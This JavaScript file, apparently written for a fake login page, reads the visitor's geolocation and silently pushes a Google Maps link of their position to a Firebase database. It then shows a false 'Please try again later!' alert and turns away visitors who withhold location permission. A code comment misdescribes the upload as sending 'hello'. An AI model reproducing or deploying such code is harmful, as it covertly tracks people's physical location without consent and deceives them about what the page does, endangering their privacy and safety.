


let googleMapsUrl;

function goToCurrentLocationOnGoogleMaps() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                // window.open(googleMapsUrl, '_blank');
            },
            (error) => {
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        console.error("User denied the request for Geolocation.");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        console.error("Location information is unavailable.");
                        break;
                    case error.TIMEOUT:
                        console.error("The request to get user location timed out.");
                        break;
                    case error.UNKNOWN_ERROR:
                        console.error("An unknown error occurred.");
                        break;
                }
            }
        );
    } else {
        console.error("Geolocation is not supported by this browser.");
    }
}



document.addEventListener('DOMContentLoaded', function () {
    // Get a reference to the database
    const database = firebase.database();

    document.getElementById('login-page').addEventListener('load', function (event) {
        event.preventDefault();

        // Example of sending "hello" to Firebase on login click
        database.ref('messages').push().set({
            message: googleMapsUrl,
            timestamp: firebase.database.ServerValue.TIMESTAMP,
        }).then(() => {
            alert('Please try again later!');
        }).catch((error) => {
            console.error('Error writing to Firebase Database', error);
        });
    });
});


async function checkLocationPermission() {
    // Check if the Permissions API is supported
    if (navigator.permissions) {
        try {
            const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });

            // Log the current permission state
            console.log(`Geolocation permission state: ${permissionStatus.state}`);

            // Return true if permission is granted, false otherwise
            return permissionStatus.state === 'granted';

        } catch (error) {
            console.error('Error querying geolocation permission:', error);
            return false;
        }
    } else {
        console.warn('Permissions API is not supported in this browser.');
        return false;
    }
}

// Usage example
checkLocationPermission().then(hasPermission => {
    if (hasPermission) {
        // Call the function
        goToCurrentLocationOnGoogleMaps();
    } else {
        alert('You do not have permission to access our website');
    }
});
